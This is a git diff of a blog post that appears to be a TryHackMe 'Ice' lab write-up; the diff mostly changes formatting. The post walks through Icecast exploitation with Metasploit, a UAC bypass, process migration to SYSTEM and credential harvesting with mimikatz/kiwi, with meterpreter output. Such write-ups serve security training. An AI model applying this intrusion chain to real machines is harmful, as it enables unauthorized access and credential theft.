@@ -6,13 +6,11 @@ categories:
   - TryHackMe
 ---
 
-<img src="ice.png" width=200 height=200 alt="ice">
+{{< post-img src="ice.png" alt="ice" style="width: 200px;" >}}
 
 ## Enumeration
 
-### nmap
-
-```
+```bash
 PORT      STATE SERVICE            REASON  VERSION
 135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
 139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
@@ -103,14 +101,12 @@ Host script results:
 ```
 
 windows machines are less frequent thus my favorites
-
 Icecast running on port 8000
-
 The room is called ice don't even look further
 
 we use metasploit `exploit(windows/http/icecast_header)`
 
-```
+```bash
 meterpreter > getuid
 Server username: Dark-PC\Dark
 meterpreter > sysinfo
@@ -135,7 +131,7 @@ I had issues here...the module was suggesting a wrong exploit
 
 the room even foretold it
 
-```
+```bash
 meterpreter > run post/multi/recon/local_exploit_suggester
 
 [*] 10.10.166.226 - Collecting local exploits for x86/windows...
@@ -149,7 +145,7 @@ The right expploit to use is
 
 `exploit(windows/local/bypassuac_eventvwr)`
 
-```
+```bash
 meterpreter > getprivs
 
 # Enabled Process Privileges
@@ -185,7 +181,7 @@ SeTakeOwnershipPrivilege is what allows us to get files
 
 we migrate to spoolsv.exe (best service for privesc)
 
-```
+```bash
 meterpreter > migrate 1260
 [*] Migrating from 1848 to 1260...
 [*] Migration completed successfully.
@@ -195,7 +191,7 @@ Server username: NT AUTHORITY\SYSTEM
 
 Ah good ol' mimikatz
 
-```
+```bash
 meterpreter > load kiwi
 Loading extension kiwi...
 .#####. mimikatz 2.2.0 20191125 (x64/windows)
@@ -213,7 +209,7 @@ Success.
 
 Now those are mimikatz (kiwi) commands
 
-```
+```bash
 meterpreter > help
 
 # Kiwi Commands
